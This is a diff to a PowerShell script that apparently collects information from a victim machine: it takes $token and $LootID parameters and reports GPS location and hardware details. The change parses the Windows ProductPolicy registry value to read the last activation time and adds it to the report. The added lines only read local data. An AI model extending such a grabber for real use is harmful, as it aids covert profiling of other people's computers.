@@ -1068,6 +1068,27 @@ param([string]$token,[string]$LootID)
         }
     }
     }
+    function Convert-BytesToDatetime([byte[]]$b) { 
+        [long]$f = ([long]$b[7] -shl 56) -bor ([long]$b[6] -shl 48) -bor ([long]$b[5] -shl 40) -bor ([long]$b[4] -shl 32) -bor ([long]$b[3] -shl 24) -bor ([long]$b[2] -shl 16) -bor ([long]$b[1] -shl 8) -bor [long]$b[0]
+        $script:activated = [datetime]::FromFileTime($f)
+    }
+    $bArr = (Get-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\ProductOptions").ProductPolicy 
+    $totalSize = ([System.BitConverter]::ToUInt32($bArr,0))
+    $policies = @()
+    $ip = 0x14
+    while ($true){
+        $eSize = ([System.BitConverter]::ToUInt16($bArr,$ip))
+        $eNameSize = ([System.BitConverter]::ToUInt16($bArr,$ip+2))
+        $eDataSize = ([System.BitConverter]::ToUInt16($bArr,$ip+6))
+        $eName = [System.Text.Encoding]::Unicode.GetString($bArr[($ip+0x10)..($ip+0xF+$eNameSize)])
+        if ($eName -eq 'Security-SPP-LastWindowsActivationTime'){
+            Convert-BytesToDatetime($bArr[($ip+0x10+$eNameSize)..($ip+0xF+$eNameSize+$eDataSize)])
+        }
+        $ip += $eSize
+        if (($ip+4) -ge $totalSize){
+            break
+        }
+    }
 
 $infomessage = "
 ==================================================================================================================================
@@ -1095,6 +1116,7 @@ Build ID              : $ver
 Architechture         : $OSArch
 Screen Size           : $screensize
 Location              : $GPS
+Activation Date       : $activated
 =============================================================
 Hardware Information
 -------------------------------------------------------------
